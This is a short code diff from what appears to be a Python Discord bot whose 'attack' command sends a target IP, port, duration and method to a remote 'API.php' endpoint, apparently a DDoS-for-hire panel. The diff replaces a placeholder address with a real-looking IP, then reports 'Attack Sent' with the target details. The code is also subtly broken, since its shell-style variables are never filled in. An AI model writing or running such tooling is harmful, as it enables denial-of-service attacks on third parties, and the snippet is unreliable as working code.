@@ -13,7 +13,7 @@ async def on_ready():
 
 @client.command()
 async def attack(ctx, ip, port, time, method):
-	request.get("http://1.1.1.1/API.php?&host=$host&port=$port&time=$time&type=$method")#changeme
+	request.get("http://34.64.89.62/API.php?&host=$host&port=$port&time=$time&type=$method")#changeme
 	embed = discord.Embed(
 		title = 'Attack Sent',
 		description = f'Attacking: {ip}\nPort: {port}\nTime: {time}\nMethod: {method}')
